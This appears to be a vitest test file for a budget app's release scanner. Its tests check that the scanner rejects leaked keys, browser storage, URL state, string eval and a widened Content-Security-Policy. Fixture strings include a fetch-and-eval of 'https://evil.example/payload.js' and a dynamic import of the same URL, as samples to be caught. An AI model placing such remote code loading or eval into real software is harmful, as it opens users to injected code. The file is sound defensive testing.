/// <reference types="node" />
import { spawnSync } from "node:child_process";
import {
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { afterEach, describe, expect, it } from "vitest";

const appDirectory = fileURLToPath(new URL("../", import.meta.url));
const scannerPath = join(appDirectory, "scripts/release-scan.mjs");
const securityHeaders = JSON.parse(
  readFileSync(join(appDirectory, "security-headers.json"), "utf8"),
) as Record<string, string>;
const temporaryDirectories: string[] = [];

interface ScanFixture {
  readonly androidConfig: string;
  readonly dist: string;
}

function write(path: string, contents: string) {
  mkdirSync(dirname(path), { recursive: true });
  writeFileSync(path, contents, "utf8");
}

function createScanFixture(): ScanFixture {
  const root = mkdtempSync(join(tmpdir(), "family-budget-release-scan-test-"));
  temporaryDirectories.push(root);
  const dist = join(root, "dist");
  const androidConfig = join(root, "capacitor.config.ts");

  write(
    join(dist, "index.html"),
    '<!doctype html><script type="module" src="/assets/index-safe.js"></script>',
  );
  write(
    join(dist, "assets/index-safe.js"),
    'const diagnostic = "https://react.dev/errors/418"; export { diagnostic };',
  );
  write(
    join(dist, "sw.js"),
    'precacheAndRoute([{url:"build-meta.json",revision:"test"}]); NavigationRoute;',
  );
  write(join(dist, "build-meta.json"), '{"buildId":"scan-test"}\n');
  write(
    join(dist, "manifest.webmanifest"),
    JSON.stringify({
      display: "standalone",
      icons: [
        {
          purpose: "any",
          sizes: "192x192",
          src: "/icon-192.png",
        },
        {
          purpose: "any maskable",
          sizes: "512x512",
          src: "/icon-512.png",
        },
      ],
      id: "/",
      scope: "/",
      start_url: "/",
    }),
  );
  write(
    join(dist, "_headers"),
    `/*\n${Object.entries(securityHeaders)
      .map(([name, value]) => `  ${name}: ${value}`)
      .join("\n")}\n`,
  );
  write(androidConfig, 'export default { webDir: "../web-pwa/dist" };\n');

  return { androidConfig, dist };
}

function runScan(fixture: ScanFixture) {
  return spawnSync(
    process.execPath,
    [
      scannerPath,
      "--dist",
      fixture.dist,
      "--android-config",
      fixture.androidConfig,
    ],
    {
      encoding: "utf8",
      env: { ...process.env },
      timeout: 10_000,
    },
  );
}

afterEach(() => {
  for (const directory of temporaryDirectories.splice(0)) {
    rmSync(directory, { force: true, recursive: true });
  }
});

describe("production release scanner", () => {
  it("accepts a clean split-free artifact containing a React diagnostic URL", () => {
    const result = runScan(createScanFixture());

    expect(result.status, result.stderr).toBe(0);
    expect(result.stdout).toContain("Release scan passed");
  });

  it("rejects browser storage in a code-split application chunk", () => {
    const fixture = createScanFixture();
    write(
      join(fixture.dist, "assets/budget-store-abc123.js"),
      'localStorage.setItem("budget", "private");',
    );

    const result = runScan(fixture);

    expect(result.status).not.toBe(0);
    expect(result.stderr).toContain(
      "browser key/value storage access found in assets/budget-store-abc123.js",
    );
  });

  it.each([
    ["AWS access key", 'const leaked = "AKIAIOSFODNN7EXAMPLE";'],
    [
      "private key",
      'const leaked = "-----BEGIN PRIVATE KEY-----\\\\nprivate\\\\n-----END PRIVATE KEY-----";',
    ],
    ["absolute local filesystem path", 'const leaked = "/Users/alice/private/budget.json";'],
  ])("rejects %s in any text artifact", (label, contents) => {
    const fixture = createScanFixture();
    write(join(fixture.dist, "metadata.json"), contents);

    const result = runScan(fixture);

    expect(result.status).not.toBe(0);
    expect(result.stderr).toContain(`${label} found in metadata.json`);
  });

  it.each([
    ["location.search", 'const filter = new URL(location.search, "http://x").search;'],
    ["location.hash", "const view = location.hash.slice(1);"],
    ["history.pushState", 'history.pushState(null, "", "/budget/january");'],
    ["history.replaceState", 'history.replaceState({ amount: 1200 }, "", "/spent");'],
  ])("rejects the address bar as a state channel: %s", (_label, contents) => {
    const fixture = createScanFixture();
    write(join(fixture.dist, "assets/router-abc123.js"), contents);

    const result = runScan(fixture);

    expect(result.status).not.toBe(0);
    expect(result.stderr).toContain(
      "URL state channel found in assets/router-abc123.js",
    );
  });

  it("accepts a query string built for an outgoing sync request", () => {
    const fixture = createScanFixture();
    write(
      join(fixture.dist, "assets/sync-transport-abc123.js"),
      'const query = new URLSearchParams({ after: cursor, keyEpoch: "3", limit: "200" });' +
        ' fetch(`${serverOrigin}/journal?${query.toString()}`);',
    );

    const result = runScan(fixture);

    expect(result.status, result.stderr).toBe(0);
    expect(result.stdout).toContain("Release scan passed");
  });

  it.each([
    'fetch("https://evil.example/payload.js").then((response) => response.text()).then(eval);',
    'import("https://evil.example/payload.js");',
  ])("rejects remote executable acquisition: %s", (contents) => {
    const fixture = createScanFixture();
    write(join(fixture.dist, "assets/lazy-feature.js"), contents);

    const result = runScan(fixture);

    expect(result.status).not.toBe(0);
    expect(result.stderr).toContain(
      "remote executable loading found in assets/lazy-feature.js",
    );
  });
});

/**
 * Запрет строкового исполнения — то, что политике позволено ослабить, и то, что нет.
 *
 * `script-src` теперь несёт `'wasm-unsafe-eval'`: без него Argon2id приглашений (`hash-wasm`,
 * WebAssembly) не компилируется в браузере. Это ключевое слово разрешает только модули
 * WebAssembly, а `eval`, `new Function` и строковые таймеры остаются запрещёнными — и запрещены
 * они не одним лишь заголовком, а сканом готовой сборки, который смотрит на сам код. Тесты ниже
 * держат оба запрета на месте: и в бандлах, и в самой политике.
 */
describe("release scanner keeps dynamic string execution out", () => {
  it.each([
    ["eval", "eval(receivedFromServer);"],
    ["new Function", 'const run = new Function("payload", receivedFromServer);'],
    ["setTimeout with a string body", 'setTimeout("drainBudget()", 0);'],
    ["setInterval with a string body", "setInterval('drainBudget()', 1000);"],
  ])("rejects %s in an application chunk", (_label, contents) => {
    const fixture = createScanFixture();
    write(join(fixture.dist, "assets/dynamic-abc123.js"), contents);

    const result = runScan(fixture);

    expect(result.status).not.toBe(0);
    expect(result.stderr).toContain(
      "dynamic string execution found in assets/dynamic-abc123.js",
    );
  });

  it("accepts the shipped policy, which allows WebAssembly and nothing else", () => {
    expect(securityHeaders["Content-Security-Policy"]).toContain(
      "script-src 'self' 'wasm-unsafe-eval'",
    );

    const result = runScan(createScanFixture());

    expect(result.status, result.stderr).toBe(0);
  });

  it("rejects a deployed policy that widens the WebAssembly allowance into 'unsafe-eval'", () => {
    const fixture = createScanFixture();
    const widened = Object.entries(securityHeaders).map(([name, value]) =>
      name === "Content-Security-Policy"
        ? `  ${name}: ${value.replace(
            "script-src 'self' 'wasm-unsafe-eval'",
            "script-src 'self' 'wasm-unsafe-eval' 'unsafe-eval'",
          )}`
        : `  ${name}: ${value}`,
    );
    write(join(fixture.dist, "_headers"), `/*\n${widened.join("\n")}\n`);

    const result = runScan(fixture);

    expect(result.status).not.toBe(0);
    expect(result.stderr).toContain("alters the \"script-src 'self' 'wasm-unsafe-eval'\" directive");
  });
});
